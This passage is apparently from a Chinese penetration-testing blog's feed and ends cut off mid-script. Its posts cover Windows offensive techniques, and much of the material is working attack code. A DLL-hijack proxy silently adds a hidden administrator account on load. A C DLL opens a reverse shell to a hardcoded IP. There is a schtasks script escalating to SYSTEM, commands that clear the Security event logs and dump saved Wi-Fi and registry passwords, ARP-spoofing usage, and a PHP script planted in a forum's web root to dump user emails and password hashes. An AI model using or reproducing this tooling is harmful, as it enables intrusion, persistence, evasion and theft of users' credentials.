EXTERNC NAKED void __cdecl////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// AheadLib 命名空间namespace AheadLib&#123; HMODULE m_hModule = NULL; // 原始模块句柄 DWORD m_dwReturn[15] = &#123;0&#125;; // 原始函数返回地址 // 加载原始模块 inline BOOL WINAPI Load() &#123; TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2]; GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT("\\version")); m_hModule = LoadLibrary(tzPath); if (m_hModule == NULL) &#123; wsprintf(tzTemp, TEXT("无法加载 %s，程序无法正常运行。"), tzPath); MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP); &#125; return (m_hModule != NULL); &#125; // 释放原始模块 inline VOID WINAPI Free() &#123; if (m_hModule) &#123; FreeLibrary(m_hModule); &#125; &#125; // 获取原始函数地址 FARPROC WINAPI GetAddress(PCSTR pszProcName) &#123; FARPROC fpAddress; CHAR szProcName[16]; TCHAR tzTemp[MAX_PATH]; if (m_hModule == NULL) &#123; if (Load() == FALSE) &#123; ExitProcess(-1); &#125; &#125; fpAddress = GetProcAddress(m_hModule, pszProcName); if (fpAddress == NULL) &#123; if (HIWORD(pszProcName) == 0) &#123; wsprintf(szProcName, "%d", pszProcName); pszProcName = szProcName; &#125; wsprintf(tzTemp, TEXT("无法找到函数 %hs，程序无法正常运行。"), pszProcName); MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP); ExitProcess(-2); &#125; return fpAddress; &#125;&#125;using namespace AheadLib;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VOID adduser()&#123; NET_API_STATUS nStatus; DWORD dwError = 0; DWORD dwLevel = 1; USER_INFO_1 ui; ui.usri1_name = L"alibaba"; //用户名 ui.usri1_password = L"password123!@#"; //密码 //ui.usri1_name = argv[1]; //ui.usri1_password = argv[1]; ui.usri1_priv = USER_PRIV_USER; //权限 ui.usri1_home_dir = NULL; ui.usri1_comment = NULL; ui.usri1_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD|UF_PASSWD_CANT_CHANGE; //登录脚本执行，密码不可更改，密码永不过期 ui.usri1_script_path = NULL; nStatus = NetUserAdd( NULL, dwLevel, (LPBYTE)&amp;ui, &amp;dwError ); LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname=ui.usri1_name; //传入用户名 nStatus = NetLocalGroupAddMembers( NULL, L"Administrators", 3, (LPBYTE)&amp;account, 1);&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 入口函数BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)&#123; if (dwReason == DLL_PROCESS_ATTACH) &#123; DisableThreadLibraryCalls(hModule); //MessageBoxW(NULL, L"DLL Hijack! by 360!!!", L":)", 0); adduser(); for (INT i = 0; i &lt; sizeof(m_dwReturn) / sizeof(DWORD); i++) &#123; m_dwReturn[i] = TlsAlloc(); &#125; &#125; else if (dwReason == DLL_PROCESS_DETACH) &#123; for (INT i = 0; i &lt; sizeof(m_dwReturn) / sizeof(DWORD); i++) &#123; TlsFree(m_dwReturn[i]); &#125; Free(); &#125; return TRUE;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetFileVersionInfoA(void)&#123; GetAddress("GetFileVersionInfoA"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetFileVersionInfoByHandle(void)&#123; GetAddress("GetFileVersionInfoByHandle"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetFileVersionInfoExW(void)&#123; GetAddress("GetFileVersionInfoExW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetFileVersionInfoSizeA(void)&#123; GetAddress("GetFileVersionInfoSizeA"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetFileVersionInfoSizeExW(void)&#123; GetAddress("GetFileVersionInfoSizeExW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetFileVersionInfoSizeW(void)&#123; GetAddress("GetFileVersionInfoSizeW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetFileVersionInfoW(void)&#123; GetAddress("GetFileVersionInfoW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerFindFileA(void)&#123; GetAddress("VerFindFileA"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerFindFileW(void)&#123; GetAddress("VerFindFileW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerInstallFileA(void)&#123; GetAddress("VerInstallFileA"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerInstallFileW(void)&#123; GetAddress("VerInstallFileW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerLanguageNameA(void)&#123; GetAddress("VerLanguageNameA"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerLanguageNameW(void)&#123; GetAddress("VerLanguageNameW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerQueryValueA(void)&#123; GetAddress("VerQueryValueA"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_VerQueryValueW(void)&#123; GetAddress("VerQueryValueW"); __asm JMP EAX;&#125;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////]]></content>
      <tags>
        <tag>奇淫巧技</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[runassystem bat实现]]></title>
    <url>%2F2017%2F06%2F11%2Frunassystem%2F</url>
    <content type="text"><![CDATA[该工具仅用作拥有administrator帐户以及非交互环境交互环境下有多种方式获取system权限 如nircmd.exe psexec wimi sc … 123456789101112131415161718192021222324252627282930313233343536@echo offver|findstr "5\.[0-9]\.[0-9][0-9]*" &gt;NUL 2&gt;NUL &amp;&amp; (echo [-] Not Working for winxp\win2k3 &amp;&amp;goto :EOF)del /f /q %result_file% &gt;NUL 2&gt;NULRd "%WinDir%\system32\test_permissions" &gt;NUL 2&gt;NULMd "%WinDir%\System32\test_permissions" 2&gt;NUL||(Echo.&amp; [-] Echo Run as administrator user. &amp;&amp;goto :EOF)set comands=%*if not defined comands ( echo. echo Run as SYSTEM Account Tool echo. echo [-] error: The syntax of the command is incorrect. echo. echo Help: echo %~n0 command goto :EOF )set result_file=%tmp%\command_result.txtschtasks.exe /create /ru "SYSTEM" /tn "runAsSystem" /sc DAILY /tr "cmd.exe /c chcp 437&gt;NUL 2&gt;NUL&amp;&amp;%comands%&gt;&gt; %result_file%" /F &gt;NUL 2&gt;NULschtasks.exe /run /tn runAsSystem /i &gt;NUL 2&gt;NULchcp 437&gt;NUL 2&gt;NUL&amp;&amp; schtasks.exe /query /tn runAsSystem /fo list| findstr /i "Running" &gt;NUL 2&gt;NUL &amp;&amp; (goto :Running ) || ( goto :Ready):Readytype %result_file%schtasks.exe /delete /tn runAsSystem /f &gt;NUL 2&gt;NULdel /f /q %result_file% &gt;NUL 2&gt;NULgoto :EOF:RunningTIMEOUT /T 1 &gt;NUL 2&gt;NULchcp 437&gt;NUL 2&gt;NUL&amp;&amp; schtasks.exe /query /tn runAsSystem /fo list| findstr /i "Running" &gt;NUL 2&gt;NUL &amp;&amp; (goto :Running ) || ( goto :Ready)goto :EOF:EOF 场景：当前为本地administrator 本地帐号想查看域帐号信息(需域帐号权限或system帐号) 但当前shell非交互也无法反弹找了几款发现仅支持 Vista以下系统psexec倒是可以非交互下使用 但是目标系统执行出错,利用wmi也不行nircmd.exe elevatecmd runassystem cmd.exe 非交互环境下不行 所以利用schtasks命令写一个批处理来实现非交互环境下 administrator 转 system用户]]></content>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win下编译最新单文件nmap]]></title>
    <url>%2F2017%2F06%2F04%2Fwindows-nmap%2F</url>
    <content type="text"><![CDATA[nmap 功能非常强大一直是广大安全测试人员最喜爱工具之一渗透测试过程中很多时候目标环境不方便安装nmap 所以就需要编译一份单文件版nmap支持低版本windows(winxp\win2003)本人代码功底非常粗浅，所遇到问题大多通过google找到解决方案的写这篇文章目的是当作个人笔记，如果想喷请有建设性的喷，欢迎指出不足，或加以改良(剔除不必要的库和功能以减少体积) 运行截图: 按照常规的方式静态编译 拿到第三方系统运行发现缺少openssl 相关库查询原因原来是 openssl 库需要单独静态编译 静态编译openssl 请参考：http://www.jianshu.com/p/4522f17ce2ffhttp://seclists.org/nmap-dev/2011/q2/att-1090/ncat-portable-static.txt 简要说明下：在Windows环境下编译openssl需要perl支持，安装ActivePerl下载OpenSSL源码 我们用VS2013来作为编译工具，打开命令行，切换到bin目录，比如 12345shell&gt; cd d:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\binshell&gt; vcvars32.batshell&gt; perl Configure --prefix=C:/OpenSSL VC-WIN32 no-asm -no-sharedshell&gt; ms\do_ms.batshell&gt; nmake -f ms\nt.mak install 此处：附上以静态编译好了的openssl静态库 免去安装编译环境的麻烦 OpenSSL静态库下载 配置包含目录及编译好的openssl库目录 设置平台工具集 使编译的文件支持低版本windows 设置静态编译 说明：多线程（MT） 与 多线程调试（MTd）貌似一样，都没有MSVCP和MSVCR函数导入，只有Kernel32.dll。同时观察这两个文件的体积，都比MD或MDd大了很多，这正是它们不需要导入运行时库DLL函数的原因，因为它们把运行时库静态编译到自己的文件中去了。这也代表着它们运行的时候不会再依赖外部的运行时库DLL文件。 来源 这里编译会遇到几个坑： 第一个坑：报错： 1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol impGetUserObjectInformationW@20 referenced in function _OPENSSL_isservice1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol impGetProcessWindowStation@0 referenced in function _OPENSSL_isservice1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol impGetDesktopWindow@0 referenced in function _OPENSSL_isservice1&gt;libeay32.lib(cryptlib.obj) : error LNK2019: unresolved external symbol impMessageBoxA@16 referenced in function _OPENSSL_showfatal 解决办法附加依赖项添加user32.libgdi32.lib 参考来源 第二个坑 选release编译，在链接的时候出问题了： 7&gt;LIBCMT.lib(crt0init.obj) : warning LNK4098: 默认库“libcmtd.lib”与其他库的使用冲突；请使用 /NODEFAULTLIB:library7&gt;LIBCMT.lib(crt0init.obj) : warning LNK4098: 默认库“msvcrt.lib”与其他库的使用冲突；请使用 /NODEFAULTLIB:library 解决办法： 在项目连接器里面忽略两个lib就可以过了libcmtd.lib 和 libcmt.lib 第三个坑： Error lnk2026: module unsafe for safeseh image 解决办法： stackoverflow 上找到解决办法 Right-click on your project -&gt;Properties -&gt;Configuration Properties -&gt;Linker -&gt;Advanced and changed “Image Has Safe Exception Handlers” to “No (/SAFESEH:NO)” 对应中文版配置如下： 解决方法二： 在项目的“属性页”中找到“链接器”标签，然后点击“命令行”将/SAFESEH:NO添加到“附加选项”的框中，点击应用即可。 原始单文件nmap 下载：nmap原始单文件大小: 2.25 MBMD5: a7628eb98bc1b705fb3099c2c6857e02 nmap 剔除openssl lua win7 测试通过 nmap瘦身版大小: 486 KBMD5: b518dba54aac5caa3ee29647411212dd 已知问题：win2k3\winxp 报错：在winxp 或win2k3 下编译 即可解决由于没有winxp 开发环境，并未解决，期待大家来解决]]></content>
      <tags>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dll nc 反弹代码]]></title>
    <url>%2F2017%2F04%2F18%2Fnetcat-dll%2F</url>
    <content type="text"><![CDATA[最近方程式smb 溢出很火 很多同学喜欢用metasploit 生成dll反弹很容易被杀根据反弹代码改写了一个 dll反弹版无编译环境的可以二进制修改ip和端口字符串。 gcc编译： 运行效果： 使用Visual Studio 2013 编译注意事项： 设置不使用预编译头或在代码中引入 stdafx.h win2003及win2008 请使用在静态库中使用MFC方式 64位系统使用请编译为64位版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "stdafx.h"#include &lt;winsock2.h&gt; #include &lt;stdlib.h&gt;#pragma comment(lib,"ws2_32")void reverse_shell();WSADATA wsaData;SOCKET Winsock;SOCKET Sock;struct sockaddr_in hax;STARTUPINFO ini_processo;PROCESS_INFORMATION processo_info;BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)&#123; switch (dwReason) &#123; case DLL_PROCESS_ATTACH: reverse_shell(); break; case DLL_PROCESS_DETACH: break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; &#125; return TRUE;&#125;void reverse_shell()&#123; LPCSTR szMyUniqueNamedEvent = "sysnullevt"; HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent); switch (GetLastError()) &#123; // app is already running case ERROR_ALREADY_EXISTS: &#123; CloseHandle(m_hEvent); break; &#125; case ERROR_SUCCESS: &#123; break; &#125; &#125; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); hax.sin_family = AF_INET; hax.sin_port = htons(atoi("443")); hax.sin_addr.s_addr = inet_addr("172.31.139.141"); WSAConnect(Winsock, (SOCKADDR*)&amp;hax, sizeof(hax), NULL, NULL, NULL, NULL); memset(&amp;ini_processo, 0, sizeof(ini_processo)); ini_processo.cb = sizeof(ini_processo); ini_processo.dwFlags = STARTF_USESTDHANDLES; ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock; CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&amp;ini_processo, &amp;processo_info);&#125; dll下载]]></content>
  </entry>
  <entry>
    <title><![CDATA[wmi一些操作]]></title>
    <url>%2F2017%2F01%2F06%2Fwindows-commandline-tips%2F</url>
    <content type="text"><![CDATA[使用wmic识别安装到系统中的补丁情况 1C:\&gt; wmic qfe get description,installedOn 外部调用获取补丁情况 12select * from Win32_QuickFixEngineeringSELECT * FROM Win32_OperatingSystemQFE 识别正在运行的服务 12C:\&gt;sc query type= serviceC:\&gt;net start 识别开机启动的程序，包括路径 1C:\&gt;wmic startup list full 查看系统中网卡的IP地址和MAC地址 1D:\&gt;wmic nicconfig get ipaddress,macaddress 用户列表 1D:\&gt;wmic useraccount list brief 查看当前系统是否有屏保保护，延迟是多少 1D:\&gt;wmic desktop get screensaversecure,screensavertimeout 域控机器 1D:\&gt;wmic ntdomain list brief 登录用户 1D:\&gt;wmic logon list brief 查看系统中开放的共享 12D:\&gt;wmic share get name,pathD:\&gt;net share 卸载和重新安装程序 12wmic product where &quot;name like &apos;%Office%&apos;&quot; get namewmic product where name=&quot;Office&quot; call uninstall 来源:查看系统中开启的日志 1C:\&gt;wmic nteventlog get path,filename,writeable 清除相关的日志（这里是全部清除） 123wevtutil cl "windows powershell"wevtutil cl "security"wevtutil cl "system" 博主注:建议使用tr 或sed 或其他方法替换关键字符*查看系统中安装的软件以及版本** 1C:\&gt;wmic product get name,version 查看某个进程的详细信息 （路径，命令行参数等） 1C:\&gt;wmic process where name=&quot;chrome.exe&quot; list full 终止一个进程 123D:\&gt;wmic process where name="xshell.exe" call terminateD:\&gt;ntsd -c q -p 进程的PIDD:\&gt;taskkill -im pid 获取存储在注册表中所有包含密码的键值： 1REG query HKCU /v "pwd" /s #pwd可替换为password \ HKCU 可替换为HKCR 显示系统中的曾经连接过的无线密码 12D:\&gt;netsh wlan show profiles D:\&gt;netsh wlan show profiles name="profiles的名字" key=clear 博主首发:一键获取: 1for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 查看当前系统是否是VMWARE 1C:\&gt;wmic bios list full | find /i "vmware" 获取进程服务名称 PID 12tasklist /svc | findstr "TermService" netstat -ano | findstr "PID" 杀毒软件 1Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct 虚拟机检测 判断TotalPhysicalMemory和NumberOfLogicalProcessors 123456789101112$VMDetected = $False$Arguments = @&#123; Class = 'Win32_ComputerSystem' Filter = 'NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648'&#125;if (Get-WmiObject @Arguments) &#123; $VMDetected = $True"In vm" &#125; else&#123; "Not in vm" &#125; 判断虚拟机进程 12345678910111213$VMwareDetected = $False$VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter 'Manufacturer LIKE"%VMware%" OR Name LIKE "%VMware%"'$VMBios = Get-WmiObject Win32_BIOS -Filter 'SerialNumber LIKE "%VMware%"'$VMToolsRunning = Get-WmiObject Win32_Process -Filter 'Name="vmtoolsd.exe"'if ($VMAdapter -or $VMBios -or $VMToolsRunning) &#123; $VMwareDetected = $True "in vm"&#125; else&#123;"not in vm"&#125; 来源:权限维持-WMI 获取电脑产品编号和型号信息 12wmic baseboard get Product,SerialNumberwmic bios get serialnumber 安装软件 12wmic product get name,versionwmic product list brief 程序运行时间 1wmic process get CreationDate 检查服务路径中包含空格且没有双引号的服务*博主首发 1wmic service where "((state='running') and (pathname like '% %') and not (pathname like '%\"%') and not (pathname like '%system32%') and not (pathname like '%syswow64%'))" get pathname,name,displayname,startname]]></content>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全局抓取iphone 手机数据包]]></title>
    <url>%2F2016%2F10%2F19%2Fiphone-network%2F</url>
    <content type="text"><![CDATA[传统方法用 burpsuite 只能抓(wifi) http数据包iOS 5后，Apple引入了RVI remote virtual interface的特性，它只需要将iOS设备使用USB数据线连接到mac上，然后使用rvictl工具以iOS设备的UDID为参数在Mac中建立一个虚拟网络接口rvi，就可以在mac设备上使用tcpdump，wireshark等工具对创建的接口进行抓包分析了。 rvictl + wireshark(tcpdump)能抓取该网卡下所有通讯 rvictl需xcode支持 手机通过usb线连接到PC 通过iTunes查看手机的UDID wireshark 指定 rvi0 接口]]></content>
      <tags>
        <tag>app安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap udf解密脚本]]></title>
    <url>%2F2016%2F07%2F29%2Fsqlmap-cloak%2F</url>
    <content type="text"><![CDATA[一次渗透测试中上传 sqlmap 自带的 udf发现无法创建函数打开文件一看根本就不像传统的二进制文件像是一种编码查看相关说明 ，原来新版sqlmap 为了防止文件被误杀对文件进行异或加密. 所幸在sqlmap 目录下发现 一个解密 脚本 路径./sqlmap/extra/cloak/cloak.py 如 lib_mysqludf_sys.dll (比较喜欢用 sqlmap 里面的 udf 不容易被杀掉) cloak.py -d -i D:\sqlmap\udf\mysql\windows\64\lib_mysqludf_sys.dll_解码之后便可直接使用了 webshell 解码方式也一样 顺便提下 ./sqlmap/extra/ 目录有几个有意思的 东西 感兴趣的同学可以研究下]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows 下tcpdump+arpspoof arp嗅探]]></title>
    <url>%2F2016%2F06%2F29%2Fwindows-arpspoof%2F</url>
    <content type="text"><![CDATA[arp 欺骗: arpspoof.exe /l ##列出网络接口arpspoof.exe 192.168.3.1 192.168.3.5 80 0 1 嗅探： tcpdump -D //查看网络接口tcpdump -i 3 -w h.cap -s 0 -s0 表示取消抓包长度限制否则会导致抓包不全！win 下的 tcpdump 好处就是 无需安装wincap 纯命令行下操作杀软不会干掉 随后便可用 wireshark 分析数据包 相关工具下载]]></content>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式笔记]]></title>
    <url>%2F2016%2F05%2F27%2FRegular-Expression-Basic%2F</url>
    <content type="text"><![CDATA[POSIX字符集[:space:] 所有空白字符（新行，空格，制表符）[\t\r\n\v\f] [:digit:] 数字 [:xdigit:] 任何一个十六进制数（即：0-9，a-f，A-F） [:punct:] 所有标点符号 [:alpha:] 所有的字母 包括汉字 [:upper:] 所有的大写字母 [:lower:] 所有的小写字母 [:alnum:] 字母和数字 相当于[0-9a-zA-Z] 包括汉字 [:cntrl:] 控制字符 [\x00-\x1F\x7F] [:print:] 非空字符 类似[:graph:] 但包括空白字符 [\x20-x7E] [:graph:] 空白字符之外的字符 [\x21-\x7E]（非空格、控制字符） [:blank:] 空格(space)与定位符(tab) [:ascii:] ASCII 字符 [\x00-\x7F] 正则表达之环视(Lookaround)(?&lt;=Expression) 逆序肯定环视，表示所在位置左侧能够匹配Expression (?&lt;!Expression) 逆序否定环视，表示所在位置左侧不能匹配Expression (?=Expression) 顺序肯定环视，表示所在位置右侧能够匹配Expression (?!Expression) 顺序否定环视，表示所在位置右侧不能匹配Expression 环视是正则中的一个难点，对于环视的理解，可以从应用和原理两个角度理解，如果想理解得更清晰、深入一些，还是从原理的角度理解好一些，正则匹配基本原理参考 NFA引擎匹配原理。 上面提到环视相当于对“所在位置”附加了一个条件，环视的难点在于找到这个“位置”，这一点解决了，环视也就没什么秘密可言了。 顺序环视匹配过程对于顺序肯定环视(?=Expression)来说，当子表达式Expression匹配成功时，(?=Expression)匹配成功，并报告(?=Expression)匹配当前位置成功。 对于顺序否定环视(?!Expression)来说，当子表达式Expression匹配成功时，(?!Expression)匹配失败；当子表达式Expression匹配失败时，(?!Expression)匹配成功，并报告(?!Expression)匹配当前位置成功；]]></content>
      <tags>
        <tag>开发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dz 一键导库脚本]]></title>
    <url>%2F2016%2F04%2F29%2Fdz-dumper%2F</url>
    <content type="text"><![CDATA[特点： 不会出现乱码 无需作任何配置 数据量超过500w 自动将数据保存至该服务器 默认 dump uc_members 表，如不存在则dump members 表。 用法： wget http://localhost/dz7.2/data2.php?dump=1 -O localhost.txt 数据量巨大(大于 500W)的情况下 防止web崩溃 或内存不足 使用下面的参数 将数据保存至当前服务器http://localhost/dz7.2/data2.php?save=1 该脚本上传至网站根目录，无需作任何配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177&lt;?phpdefine("ENDSTR",End_str());ignore_user_abort();set_time_limit(0);ini_set("max_execution_time","0");ob_clean();require_once './include/common.inc.php';header('Content-type: text/html;charset=utf-8');ini_set('memory_limit',-1);error_reporting(0);$dump=$_GET['dump']?$_GET['dump']:0;$save=$_GET['save']?$_GET['save']:0;$tablename_arr=array("uc_members","members");$result= $db-&gt;result ( $db-&gt;query("SHOW TABLES like '%$tablename_arr[0]%' "),0);$result1= $db-&gt;result ( $db-&gt;query("SHOW TABLES like '%$tablename_arr[1]%' "),0);if(!empty($result) &amp;&amp; !empty ($result1)) &#123; $tablename = $result; $type=2;&#125;else&#123; $tablename = $result1; $type=1;&#125;$count=$db-&gt;result ( $db-&gt;query("select count(-1) from $tablename"),0);if( empty($tablename)&amp;&amp; $count ==0)&#123; exit('表为空,或没有想要查询的表'.ENDSTR);&#125;$endstr=ENDSTR;$infos=&lt;&lt;&lt;EOL 基本信息 ------------------------------------------------------------- &#123;$endstr&#125; 当前表: &#123;$tablename&#125; &#123;$endstr&#125; 数据量: &#123;$count&#125; &#123;$endstr&#125; 网站编码: &#123;$GLOBALS['charset']&#125; &#123;$endstr&#125; 当前页面所使用编码:utf-8 &#123;$endstr&#125;&#123;$endstr&#125;&#123;$endstr&#125; 帮助信息&#123;$endstr&#125; -------------------------------------------------------------&#123;$endstr&#125; 使用wget下载:&#123;$endstr&#125; wget http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]?dump=1 -O $_SERVER[HTTP_HOST].txt&#123;$endstr&#125;&#123;$endstr&#125; 数据量巨大(大于 500W)的情况下 防止web崩溃 或内存不足 使用下面的参数 将数据保存至当前服务器&#123;$endstr&#125; http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]?save=1&#123;$endstr&#125;&#123;$endstr&#125;EOL;if(is_Browser() &amp;&amp; $dump==0 &amp;&amp;$save==0 ) &#123; exit($infos);&#125;/****************************** wget 下载部分/******************************/if($dump!=0)&#123; if(is_Browser())&#123; exit('请使用wget访问'.ENDSTR.'wget http://'."$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]?dump=1 -O $_SERVER[HTTP_HOST].txt".ENDSTR); &#125; $limit_start=0; $limit_length=5000; $limit_end=$count;$limit_end=$limit_end-$limit_start; $limit_length=$limit_end&gt;$limit_length?$limit_length:$limit_end; $section=ceil($limit_end/$limit_length); if (ob_get_level() == 0)&#123; ob_start(); &#125; echo "当前表: &#123;$tablename&#125; &#123;$endstr&#125;". "数据量: &#123;$count&#125; &#123;$endstr&#125;"; echo "---------------------------------------------------------------------------------------&#123;$endstr&#125;";if($type==2)&#123; for($i=0;$i&lt;$section;$i++) &#123; $sql = "select email,username,password,salt from $tablename " . ' LIMIT ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';'; $query=$db-&gt;query($sql); while($result=$db-&gt;fetch_array($query))&#123; echo iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['password'])."\t". iconv($GLOBALS['charset'],"UTF-8",$result['salt']).ENDSTR; &#125; ob_end_flush(); &#125;&#125;else&#123; for($i=0;$i&lt;$section;$i++) &#123; $sql = "select email,username,password from $tablename " . ' LIMIT ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';'; $query=$db-&gt;query($sql); while($result=$db-&gt;fetch_array($query))&#123; echo iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['password']).ENDSTR; &#125; ob_end_flush(); &#125;&#125;exit();&#125;if($save!=0)&#123; ob_end_flush(); $filename='data_'.substr(md5(mt_rand()),28,12).'.txt'; $limit_start=0; $limit_length=10000; $limit_end=$count;$limit_end=$limit_end-$limit_start; $limit_length=$limit_end&gt;$limit_length?$limit_length:$limit_end; $section=ceil($limit_end/$limit_length); $head= "当前表: &#123;$tablename&#125; ".PHP_EOL. "数据量: &#123;$count&#125; ".PHP_EOL. "---------------------------------------------------------------------------------------".PHP_EOL; file_put_contents($filename,$head); if($type==2)&#123; for($i=0;$i&lt;$section;$i++) &#123; $sql = "select email,username,password,salt from $tablename " . ' LIMIT ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';'; $query=$db-&gt;query($sql); echo '正在执行: '.$sql.ENDSTR; flush(); while($result=$db-&gt;fetch_array($query))&#123; file_put_contents($filename,iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['password'])."\t". iconv($GLOBALS['charset'],"UTF-8",$result['salt']).PHP_EOL,FILE_APPEND); &#125; &#125; echo(ENDSTR.'备份完毕，下载地址为: '. DownloadName().$filename.' 请立即下载！'); &#125;else&#123; for($i=0;$i&lt;$section;$i++) &#123; $sql = "select email,username,password from $tablename " . ' LIMIT ' . ($limit_start + 1 + $i * $limit_length) . ',' . $limit_length . ';'; $query=$db-&gt;query($sql); echo '正在执行: '.$sql.ENDSTR; flush(); while($result=$db-&gt;fetch_array($query))&#123; file_put_contents($filename,iconv($GLOBALS['charset'],'UTF-8',$result['email'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['username'])."\t". iconv($GLOBALS['charset'],'UTF-8',$result['password']).PHP_EOL,FILE_APPEND); &#125; &#125; echo(ENDSTR.'备份完毕，下载地址为: '. DownloadName().$filename.' 请立即下载！'); &#125;&#125;function End_str()&#123; if(stristr($_SERVER[HTTP_USER_AGENT],'wget') || 